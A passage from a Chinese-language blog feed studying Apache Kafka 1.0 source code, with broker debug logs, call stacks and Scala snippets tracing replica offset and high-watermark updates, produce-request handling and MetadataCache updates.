class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">401</span>] INFO testEnter0007-maybeIncrementLeaderHW:Set(<span class="hljs-number">36</span> [<span class="hljs-number">0</span> : <span class="hljs-number">2844</span>]) newHighWatermark:<span class="hljs-number">36</span> oldHighWatermark <span class="hljs-number">35</span>; (com.code260.ss.KafkaTestUtils$)********************************[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">922</span>] INFO Handling request:RequestHeader(apiKey=FETCH, apiVersion=<span class="hljs-number">5</span>, clientId=broker-<span class="hljs-number">0</span>-fetcher-<span class="hljs-number">0</span>, correlationId=<span class="hljs-number">8858</span>) -- &#123;replica_id=<span class="hljs-number">0</span>,max_wait_time=<span class="hljs-number">500</span>,min_bytes=<span class="hljs-number">1</span>,max_bytes=<span class="hljs-number">10485760</span>,isolation_level=<span class="hljs-number">0</span>,topics=[&#123;topic=test.vv19,partitions=[&#123;partition=<span class="hljs-number">0</span>,fetch_offset=<span class="hljs-number">36</span>,log_start_offset=<span class="hljs-number">0</span>,max_bytes=<span class="hljs-number">1048576</span>&#125;]&#125;]&#125; from connection <span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">9094</span>-<span class="hljs-number">172.16</span><span class="hljs-number">.113</span><span class="hljs-number">.38</span>:<span class="hljs-number">49385</span>-<span class="hljs-number">0</span>;securityProtocol:PLAINTEXT,principal:User:ANONYMOUS (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">923</span>] INFO testEnter0006-replica:<span class="hljs-number">0</span> newLogEndOffset:<span class="hljs-number">36</span> oldLogEndOffsetMetadata <span class="hljs-number">36</span>; (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">923</span>] INFO testEnter0007-maybeIncrementLeaderHW:Set(<span class="hljs-number">36</span> [<span class="hljs-number">0</span> : <span class="hljs-number">2844</span>]) newHighWatermark:<span class="hljs-number">36</span> oldHighWatermark <span class="hljs-number">36</span>; (com.code260.ss.KafkaTestUtils$)</code></pre><p>更新leader上维护的follower的LEO testEnter0006 时的调用栈<br>也是在处理follower发布过来的fetch请求时更新  </p><pre><code class="hljs java">Replica.logEndOffset_$eq(LogOffsetMetadata) line: <span class="hljs-number">98</span>Replica.updateLogReadResult(LogReadResult) line: <span class="hljs-number">83</span>Partition.updateReplicaLogReadResult(Replica, LogReadResult) line: <span class="hljs-number">276</span>ReplicaManager$$anonfun$updateFollowerLogReadResults$<span class="hljs-number">2</span>.apply(Tuple2&lt;TopicPartition,LogReadResult&gt;) line: <span class="hljs-number">1314</span>ReplicaManager$$anonfun$updateFollowerLogReadResults$<span class="hljs-number">2</span>.apply(Object) line: <span class="hljs-number">1308</span>TraversableLike$$anonfun$map$<span class="hljs-number">1</span>.apply(A) line: <span class="hljs-number">234</span>TraversableLike$$anonfun$map$<span class="hljs-number">1</span>.apply(Object) line: <span class="hljs-number">234</span>ResizableArray$class.foreach(ResizableArray, Function1) line: 59ArrayBuffer&lt;A&gt;.foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">48</span>TraversableLike$class.map(TraversableLike, Function1, CanBuildFrom) line: 234ArrayBuffer&lt;A&gt;(AbstractTraversable&lt;A&gt;).map(Function1&lt;A,B&gt;, CanBuildFrom&lt;Traversable&lt;A&gt;,B,That&gt;) line: <span class="hljs-number">104</span>ReplicaManager.updateFollowerLogReadResults(<span class="hljs-keyword">int</span>, Seq&lt;Tuple2&lt;TopicPartition,LogReadResult&gt;&gt;) line: <span class="hljs-number">1308</span>ReplicaManager.readFromLog$<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, Seq, ReplicaQuota, IsolationLevel, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">799</span>ReplicaManager.fetchMessages(<span class="hljs-keyword">long</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, Seq&lt;Tuple2&lt;TopicPartition,PartitionData&gt;&gt;, ReplicaQuota, Function1&lt;Seq&lt;Tuple2&lt;TopicPartition,FetchPartitionData&gt;&gt;,BoxedUnit&gt;, IsolationLevel) line: <span class="hljs-number">803</span>KafkaApis.handleFetchRequest(RequestChannel$Request) line: <span class="hljs-number">597</span></code></pre><p>更新leader的HW testEnter0007-maybeIncrementLeaderHW 调用栈<br>在处理follower发布过来的fetch请求时更新  </p><pre><code class="hljs java">Partition.kafka$cluster$Partition$$maybeIncrementLeaderHW(Replica, <span class="hljs-keyword">long</span>) line: <span class="hljs-number">396</span>Partition$$anonfun$maybeExpandIsr$<span class="hljs-number">1</span>.apply$mcZ$sp() line: <span class="hljs-number">325</span>Partition$$anonfun$maybeExpandIsr$<span class="hljs-number">1</span>.apply() line: <span class="hljs-number">309</span>Partition$$anonfun$maybeExpandIsr$<span class="hljs-number">1</span>.apply() line: <span class="hljs-number">309</span>CoreUtils$.inLock(Lock, Function0&lt;T&gt;) line: <span class="hljs-number">217</span>CoreUtils$.inWriteLock(ReadWriteLock, Function0&lt;T&gt;) line: <span class="hljs-number">225</span>Partition.maybeExpandIsr(<span class="hljs-keyword">int</span>, LogReadResult) line: <span class="hljs-number">307</span>Partition.updateReplicaLogReadResult(Replica, LogReadResult) line: <span class="hljs-number">283</span>ReplicaManager$$anonfun$updateFollowerLogReadResults$<span class="hljs-number">2</span>.apply(Tuple2&lt;TopicPartition,LogReadResult&gt;) line: <span class="hljs-number">1314</span>ReplicaManager$$anonfun$updateFollowerLogReadResults$<span class="hljs-number">2</span>.apply(Object) line: <span class="hljs-number">1308</span>TraversableLike$$anonfun$map$<span class="hljs-number">1</span>.apply(A) line: <span class="hljs-number">234</span>TraversableLike$$anonfun$map$<span class="hljs-number">1</span>.apply(Object) line: <span class="hljs-number">234</span>ResizableArray$class.foreach(ResizableArray, Function1) line: 59ArrayBuffer&lt;A&gt;.foreach(Function1&lt;A,U&gt;) line: <span class="hljs-number">48</span>TraversableLike$class.map(TraversableLike, Function1, CanBuildFrom) line: 234ArrayBuffer&lt;A&gt;(AbstractTraversable&lt;A&gt;).map(Function1&lt;A,B&gt;, CanBuildFrom&lt;Traversable&lt;A&gt;,B,That&gt;) line: <span class="hljs-number">104</span>ReplicaManager.updateFollowerLogReadResults(<span class="hljs-keyword">int</span>, Seq&lt;Tuple2&lt;TopicPartition,LogReadResult&gt;&gt;) line: <span class="hljs-number">1308</span>ReplicaManager.readFromLog$<span class="hljs-number">1</span>(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, Seq, ReplicaQuota, IsolationLevel, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>, <span class="hljs-keyword">boolean</span>) line: <span class="hljs-number">799</span>ReplicaManager.fetchMessages(<span class="hljs-keyword">long</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>, <span class="hljs-keyword">boolean</span>, Seq&lt;Tuple2&lt;TopicPartition,PartitionData&gt;&gt;, ReplicaQuota, Function1&lt;Seq&lt;Tuple2&lt;TopicPartition,FetchPartitionData&gt;&gt;,BoxedUnit&gt;, IsolationLevel) line: <span class="hljs-number">803</span>KafkaApis.handleFetchRequest(RequestChannel$Request) line: <span class="hljs-number">597</span></code></pre><p>Follower节点  </p><pre><code class="hljs java">[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">767</span>] INFO testEnter0005-Received response:apikey:FETCH correlationId <span class="hljs-number">8855</span>; (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">767</span>] INFO testEnter0002-<span class="hljs-number">001</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">35</span>]lso.messageOffset: [<span class="hljs-number">35</span>] (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">22</span>,<span class="hljs-number">768</span>] INFO testEnter0002-<span class="hljs-number">002</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">35</span>]lso.messageOffset: [<span class="hljs-number">35</span>] (com.code260.ss.KafkaTestUtils$)********************************[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">316</span>] INFO testEnter0005-Received response:apikey:FETCH correlationId <span class="hljs-number">8856</span>; (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">369</span>] INFO Updated PartitionLeaderEpoch. New: &#123;epoch:<span class="hljs-number">27</span>, offset:<span class="hljs-number">35</span>&#125;, Current: &#123;epoch:<span class="hljs-number">25</span>, offset34&#125; <span class="hljs-keyword">for</span> Partition: test.vv19-<span class="hljs-number">0</span>. Cache now contains <span class="hljs-number">11</span> entries. (kafka.server.epoch.LeaderEpochFileCache)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">396</span>] INFO testEnter0002-<span class="hljs-number">001</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">35</span>]lso.messageOffset: [<span class="hljs-number">35</span>] (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">397</span>] INFO testEnter0002-<span class="hljs-number">002</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">35</span>]lso.messageOffset: [<span class="hljs-number">35</span>] (com.code260.ss.KafkaTestUtils$)****************************************************************[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">920</span>] INFO testEnter0005-Received response:apikey:FETCH correlationId <span class="hljs-number">8857</span>; (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">921</span>] INFO testEnter0002-<span class="hljs-number">001</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">35</span>]lso.messageOffset: [<span class="hljs-number">35</span>] (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">23</span>,<span class="hljs-number">922</span>] INFO testEnter0002-<span class="hljs-number">002</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">36</span>]lso.messageOffset: [<span class="hljs-number">36</span>] (com.code260.ss.KafkaTestUtils$)********************************[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">24</span>,<span class="hljs-number">426</span>] INFO testEnter0005-Received response:apikey:FETCH correlationId <span class="hljs-number">8858</span>; (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">24</span>,<span class="hljs-number">427</span>] INFO testEnter0002-<span class="hljs-number">001</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">36</span>]lso.messageOffset: [<span class="hljs-number">36</span>] (com.code260.ss.KafkaTestUtils$)[<span class="hljs-number">2019</span>-<span class="hljs-number">09</span>-<span class="hljs-number">25</span> <span class="hljs-number">19</span>:<span class="hljs-number">40</span>:<span class="hljs-number">24</span>,<span class="hljs-number">428</span>] INFO testEnter0002-<span class="hljs-number">002</span>topicPartition:test.vv19:<span class="hljs-number">0</span>hwm.messageOffset: [<span class="hljs-number">36</span>]lso.messageOffset: [<span class="hljs-number">36</span>] (com.code260.ss.KafkaTestUtils$)</code></pre><h3 id="请求处理"><a href="#请求处理" class="headerlink" title="请求处理"></a>请求处理</h3><p><code>handleProduceRequest</code>  <code>ProduceRequest</code><br>ReplicaManager.appendRecords  </p><ul><li>timeout: Long  // 来自请求体   </li><li>requiredAcks: Short  // 来自请求体   </li><li>internalTopicsAllowed: Boolean  // request.header.clientId是否是__admin_client  </li><li>isFromClient: Boolean  // 固定送true   </li><li>entriesPerPartition: Map[TopicPartition, MemoryRecords]  </li><li>responseCallback: Map[TopicPartition, ProduceResponse.PartitionResponse] =&gt; Unit  </li><li>delayedProduceLock: Option[Lock]  // 未送  </li><li>processingStatsCallback: Map[TopicPartition, RecordsProcessingStats] =&gt; Unit  </li></ul><p>主要写日志逻辑：<br>kafka.log.Log.append(records: MemoryRecords, isFromClient: Boolean, assignOffsets: Boolean, leaderEpoch: Int) 623行 要细读   </p><p>消息写入时：Log LogSegment FileRecords MeomoryRecords File LogOffsetMetadata 之间的联系  </p><p>一条新的消息的offset是怎么产生的？每次append消息后会更新下一次的offset：  </p><pre><code class="hljs java"> <span class="hljs-comment">// increment the log end offset</span>updateLogEndOffset(appendInfo.lastOffset + <span class="hljs-number">1</span>)</code></pre><h3 id="leader节点在处理生产消息请求时对相应的offset的处理"><a href="#leader节点在处理生产消息请求时对相应的offset的处理" class="headerlink" title="leader节点在处理生产消息请求时对相应的offset的处理"></a>leader节点在处理生产消息请求时对相应的offset的处理</h3><p> KafkaApis handleProduceRequest<br> ReplicaManager appendRecords<br>    ReplicaManager appendToLocalLog<br>    processingStatsCallback  // KafkaApis def processingStatsCallback(processingStats: Map[TopicPartition, RecordsProcessingStats]): Unit<br>    responseCallback  // KafkaApis def sendResponseCallback(responseStatus: Map[TopicPartition, PartitionResponse])<br> ProduceRequest clearPartitionRecords  </p><p>ReplicaManager appendToLocalLog<br>生产消息的度量数据收集(为写入速度做准备)，全局的和topic粒度的。<br>check是否是向内部topic发送消息的<br>消息写入leader partition.appendRecordsToLeader<br>   val info = log.appendAsLeader<br>   replicaManager.tryCompleteDelayedFetch(TopicPartitionOperationKey(this.topic, this.partitionId))<br>   (info, maybeIncrementLeaderHW(leaderReplica))<br>更新firstOffset  lastOffset  numAppendedMessages<br>生产消息的度量数据收集(条数和消息大小)，全局的和topic粒度的。 </p><p>Log.append<br>分配消息的val offset = new LongRef(nextOffsetMetadata.messageOffset)<br>更新 firstOffset  appendInfo.firstOffset = offset.value<br>更新 lastOffset appendInfo.lastOffset = offset.value - 1<br>如果有消息校验不同过 收集拒掉的消息的度量数据<br>更新leader epoch对应的offset(只有当epoch发生改变时才更新，而且更新是直接flush到磁盘且用FD的sync强制落盘，fileOutputStream.getFD().sync()) leaderEpochCache.assign(batch.partitionLeaderEpoch, batch.baseOffset) 并 LeaderEpochCheckpoint 进行flush<br>segment.append<br>producerAppendInfo.maybeCacheTxnFirstOffsetMetadata<br>producerStateManager.update(producerAppendInfo)<br>事务消息的一些idx的处理<br>producerStateManager.updateMapEndOffset<br>updateLogEndOffset<br>updateFirstUnstableOffset<br>按需flush()<br>返回appendInfo  </p><p>processingStatsCallback<br>更新produceMessageConversionsRate度量数据conversionCount topic粒度和全局的，conversionCount是指高版本格式消息向低版本格式消息的转换，转换逻辑在org.apache.kafka.common.record.AbstractRecords.downConvert(Iterable&lt;? extends RecordBatch&gt;, byte, long, Time)，调用发起是在org.apache.kafka.clients.producer.internals.Sender.sendProduceRequest(long, int, short, int, List<ProducerBatch>)    </p><p>responseCallback<br>是否有错误，有的话写日志；Throttle处理；</p><p>Partition.maybeIncrementLeaderHW分析</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>kafka1.0源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MetadataCache更新</title>
    <link href="/2020/04/22/kafka1-0-metadata-update/"/>
    <url>/2020/04/22/kafka1-0-metadata-update/</url>
    
    <content type="html"><![CDATA[<h2 id="MetadataCache什么时候更新"><a href="#MetadataCache什么时候更新" class="headerlink" title="MetadataCache什么时候更新"></a>MetadataCache什么时候更新</h2><p>updateCache方法用来更新缓存的。   </p><h3 id="发起线程-controller-event-thread"><a href="#发起线程-controller-event-thread" class="headerlink" title="发起线程  controller-event-thread"></a>发起线程  controller-event-thread</h3><h4 id="controller选举的时候"><a href="#controller选举的时候" class="headerlink" title="controller选举的时候"></a>controller选举的时候</h4><table><tr><td>CLASS_NAME   </td><td>  METHOD_NAME</td><td>    LINE_NUM</td></tr>  <tr><td>kafka/controller/KafkaController </td><td>  sendUpdateMetadataRequest </td><td>     1043</td></tr>  <tr><td>kafka/controller/KafkaController  </td><td> onControllerFailover  </td><td>    288</td></tr>  <tr><td>kafka/controller/KafkaController  </td><td> elect   </td><td>  1658</td></tr>  <tr><td>kafka/controller/KafkaController$Startup$   </td><td> process  </td><td> 1581</td></tr>  <tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1 </td><td>apply$mcV$sp </td><td>  53</td></tr>  <tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1 </td><td>apply  </td><td>   53</td></tr>  <tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1</td><td> apply  </td><td>   53</td></tr>  <tr><td>kafka/metrics/KafkaTimer</td><td> time </td><td>32</td></tr>  <tr><td>kafka/controller/ControllerEventManager$ControllerEventThread  </td><td>  doWork  </td><td>  64</td></tr>  <tr><td>kafka/utils/ShutdownableThread  </td><td>   run  </td><td>70</td></tr>  </table>  <p>启动的时候选举，启动这个动作也是个事件  </p><pre><code class="hljs scala"><span class="hljs-comment">// KafkaController.scala</span>  <span class="hljs-keyword">case</span> <span class="hljs-class"><span class="hljs-keyword">object</span> <span class="hljs-title">Startup</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ControllerEvent</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">state</span> </span>= <span class="hljs-type">ControllerState</span>.<span class="hljs-type">ControllerChange</span>    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">process</span></span>(): <span class="hljs-type">Unit</span> = &#123;      registerSessionExpirationListener()      registerControllerChangeListener()      elect()    &#125;  &#125;</code></pre><h4 id="broker启动的时候"><a href="#broker启动的时候" class="headerlink" title="broker启动的时候"></a>broker启动的时候</h4><table><tr><td>CLASS_NAME  </td><td>   METHOD_NAME  </td><td>  LINE_NUM</td></tr><tr><td>kafka/controller/KafkaController  </td><td> sendUpdateMetadataRequest    </td><td> 1043</td></tr><tr><td>kafka/controller/KafkaController  </td><td> onBrokerStartup   </td><td>  387</td></tr><tr><td>kafka/controller/KafkaController$BrokerChange  </td><td>   process  </td><td> 1208</td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1 </td><td>apply$mcV$sp </td><td>  53</td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1 </td><td>apply </td><td>    53</td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1</td><td> apply </td><td>    53</td></tr><tr><td>kafka/metrics/KafkaTimer </td><td>time </td><td>32</td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread   </td><td> doWork </td><td>   64</td></tr><tr><td>kafka/utils/ShutdownableThread   </td><td>  run </td><td> 70</td></tr></table><h4 id="topic删除的时候"><a href="#topic删除的时候" class="headerlink" title="topic删除的时候"></a>topic删除的时候</h4><table><tr><td>CLASS_NAME  </td><td>   METHOD_NAME   </td><td>  LINE_NUM  </td></tr><tr><td>kafka/controller/KafkaController   </td><td> sendUpdateMetadataRequest    </td><td>  1043 </td></tr><tr><td>kafka/controller/TopicDeletionManager   </td><td> kafka$controller$TopicDeletionManager$$onTopicDeletion  </td><td>268  </td></tr><tr><td>kafka/controller/TopicDeletionManager$$anonfun$resumeDeletions$2  </td><td>apply   </td><td>   333  </td></tr><tr><td>kafka/controller/TopicDeletionManager$$anonfun$resumeDeletions$2  </td><td>apply  </td><td>    333  </td></tr><tr><td>scala/collection/immutable/Set$Set1    </td><td>  foreach  </td><td>  94   </td></tr><tr><td>kafka/controller/TopicDeletionManager   </td><td> resumeDeletions    </td><td>  333  </td></tr><tr><td>kafka/controller/TopicDeletionManager   </td><td> enqueueTopicsForDeletion  </td><td>110  </td></tr><tr><td>kafka/controller/KafkaController$TopicDeletion   </td><td>  process   </td><td> 1280 </td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1 </td><td> apply$mcV$sp  </td><td>  53   </td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1  </td><td>apply </td><td>     53   </td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1 </td><td> apply  </td><td>    53   </td></tr><tr><td>kafka/metrics/KafkaTimer  </td><td>time  </td><td>32   </td></tr><tr><td>kafka/controller/ControllerEventManager$ControllerEventThread  </td><td>   doWork   </td><td>  64   </td></tr><tr><td>kafka/utils/ShutdownableThread    </td><td>  run   </td><td>70</td></tr></table>   <h4 id="topic创建或者修改的时候"><a href="#topic创建或者修改的时候" class="headerlink" title="topic创建或者修改的时候"></a>topic创建或者修改的时候</h4><table><tr><td>CLASS_NAME</td><td>    METHOD_NAME</td><td>    LINE_NUM</td></tr><tr><td>kafka/controller/ControllerBrokerRequestBatch</td><td>    updateMetadataRequestBrokerSet</td><td>    291</td></tr>  <tr><td>kafka/controller/ControllerBrokerRequestBatch    </td><td>newBatch    </td><td>294</td></tr>  <tr><td>kafka/controller/PartitionStateMachine    </td><td>handleStateChanges</td><td>    105</td></tr>  <tr><td>kafka/controller/KafkaController</td><td>    onNewPartitionCreation    </td><td>499</td></tr>  <tr><td>kafka/controller/KafkaController</td><td>    onNewTopicCreation</td><td>    485</td></tr>  <tr><td>kafka/controller/KafkaController$TopicChange</td><td>    process    </td><td>1237</td></tr>  <tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1</td><td>    apply$mcV$sp</td><td>    53</td></tr>  <tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1    </td><td>apply</td><td>    53</td></tr>  <tr><td>kafka/controller/ControllerEventManager$ControllerEventThread$$anonfun$doWork$1    </td><td>apply    </td><td>53</td></tr>  <tr><td>kafka/metrics/KafkaTimer</td><td>    time    </td><td>32</td></tr>  <tr><td>kafka/controller/ControllerEventManager$ControllerEventThread</td><td>    doWork    </td><td>64</td></tr>  <tr><td>kafka/utils/ShutdownableThread    </td><td>run    </td><td>70</td></tr>  </table>  <p>topic创建这个是从队列中拿到事件再处理的方式<br>队列是<code>kafka.controller.ControllerEventManager.queue</code><br>放入过程如下，本质还是监听zk的path的child的变化：  </p><table><tr><td>CLASS_NAME</td><td>    METHOD_NAME    </td><td>LINE_NUM</td></tr><tr><td>kafka/controller/ControllerEventManager</td><td>put</td><td>    44</td></tr><tr><td>kafka/controller/TopicChangeListener    </td><td>handleChildChange    </td><td>1712</td></tr><tr><td>org/I0Itec/zkclient/ZkClient$10    </td><td>run</td><td>    848</td></tr><tr><td>org/I0Itec/zkclient/ZkEventThread    </td><td>run</td><td>    85</td></tr></table><p>注册监听器的代码如下:  </p><pre><code class="hljs scala"><span class="hljs-comment">// class KafkaController</span>  <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">registerTopicChangeListener</span></span>() = &#123;    zkUtils.subscribeChildChanges(<span class="hljs-type">BrokerTopicsPath</span>, topicChangeListener)  &#125;</code></pre><p>顺带说一下有6个地方订阅了zk的子节点的变化：  </p><ul><li>DynamicConfigManager.startup</li><li>registerTopicChangeListener</li><li>registerIsrChangeNotificationListener</li><li>registerTopicDeletionListener</li><li>registerBrokerChangeListener</li><li>registerLogDirEventNotificationListener </li></ul><p>处理创建topic事件：  </p><pre><code class="hljs scala"><span class="hljs-comment">// ControllerChannelManager.scala  class ControllerBrokerRequestBatch</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendRequestsToBrokers</span></span>(controllerEpoch: <span class="hljs-type">Int</span>) &#123;  <span class="hljs-comment">// .......</span>      <span class="hljs-keyword">val</span> updateMetadataRequest = &#123;        <span class="hljs-keyword">val</span> liveBrokers = <span class="hljs-keyword">if</span> (updateMetadataRequestVersion == <span class="hljs-number">0</span>) &#123;          <span class="hljs-comment">// .......</span>        &#125; <span class="hljs-keyword">else</span> &#123;          controllerContext.liveOrShuttingDownBrokers.map &#123; broker =&gt;            <span class="hljs-keyword">val</span> endPoints = broker.endPoints.map &#123; endPoint =&gt;              <span class="hljs-keyword">new</span> <span class="hljs-type">UpdateMetadataRequest</span>.<span class="hljs-type">EndPoint</span>(endPoint.host, endPoint.port, endPoint.securityProtocol, endPoint.listenerName)            &#125;            <span class="hljs-keyword">new</span> <span class="hljs-type">UpdateMetadataRequest</span>.<span class="hljs-type">Broker</span>(broker.id, endPoints.asJava, broker.rack.orNull)          &#125;        &#125;        <span class="hljs-keyword">new</span> <span class="hljs-type">UpdateMetadataRequest</span>.<span class="hljs-type">Builder</span>(updateMetadataRequestVersion, controllerId, controllerEpoch, partitionStates.asJava,          liveBrokers.asJava)      &#125;      updateMetadataRequestBrokerSet.foreach &#123; broker =&gt;        controller.sendRequest(broker, <span class="hljs-type">ApiKeys</span>.<span class="hljs-type">UPDATE_METADATA</span>, updateMetadataRequest, <span class="hljs-literal">null</span>)      &#125;      <span class="hljs-comment">// .......</span>    &#125;</code></pre><p>topic创建时更新metadata再进一步的过程<br>构建发送请求事件放入发送队列等待发送线程发送<br>构建发送请求事件代码如下：  </p><pre><code class="hljs scala"><span class="hljs-comment">// ControllerChannelManager</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sendRequest</span></span>(brokerId: <span class="hljs-type">Int</span>, apiKey: <span class="hljs-type">ApiKeys</span>, request: <span class="hljs-type">AbstractRequest</span>.<span class="hljs-type">Builder</span>[_ &lt;: <span class="hljs-type">AbstractRequest</span>],                  callback: <span class="hljs-type">AbstractResponse</span> =&gt; <span class="hljs-type">Unit</span> = <span class="hljs-literal">null</span>) &#123;    brokerLock synchronized &#123;      <span class="hljs-keyword">val</span> stateInfoOpt = brokerStateInfo.get(brokerId)      stateInfoOpt <span class="hljs-keyword">match</span> &#123;        <span class="hljs-keyword">case</span> <span class="hljs-type">Some</span>(stateInfo) =&gt;          stateInfo.messageQueue.put(<span class="hljs-type">QueueItem</span>(apiKey, request, callback))        <span class="hljs-keyword">case</span> <span class="hljs-type">None</span> =&gt;          warn(<span class="hljs-string">"Not sending request %s to broker %d, since it is offline."</span>.format(request, brokerId))      &#125;    &#125;  &#125;</code></pre><p>调用栈：  </p><table><tr><td>CLASS_NAME</td><td>METHOD_NAME</td><td>LINE_NUM</td></tr><tr><td>kafka/controller/ControllerChannelManager</td><td>sendRequest</td><td>81</td></tr><tr><td>kafka/controller/KafkaController</td><td>sendRequest</td><td>662</td></tr><tr><td>kafka/controller/ControllerBrokerRequestBatch$$anonfun$sendRequestsToBrokers$2</td><td>apply</td><td>405</td></tr><tr><td>kafka/controller/ControllerBrokerRequestBatch$$anonfun$sendRequestsToBrokers$2</td><td>apply</td><td>405</td></tr><tr><td>scala/collection/mutable/HashMap$$anonfun$foreach$1</td><td>apply</td><td>130</td></tr><tr><td>scala/collection/mutable/HashMap$$anonfun$foreach$1</td><td>apply</td><td>130</td></tr><tr><td>scala/collection/mutable/HashTable$class</td><td>foreachEntry</td><td>241</td></tr><tr><td>scala/collection/mutable/HashMap</td><td>foreachEntry</td><td>40</td></tr><tr><td>scala/collection/mutable/HashMap</td><td>foreach</td><td>130</td></tr><tr><td>kafka/controller/ControllerBrokerRequestBatch</td><td>sendRequestsToBrokers</td><td>502</td></tr><tr><td>kafka/controller/PartitionStateMachine</td><td>handleStateChanges</td><td>105</td></tr><tr><td>kafka/controller/KafkaController</td><td>onNewPartitionCreatio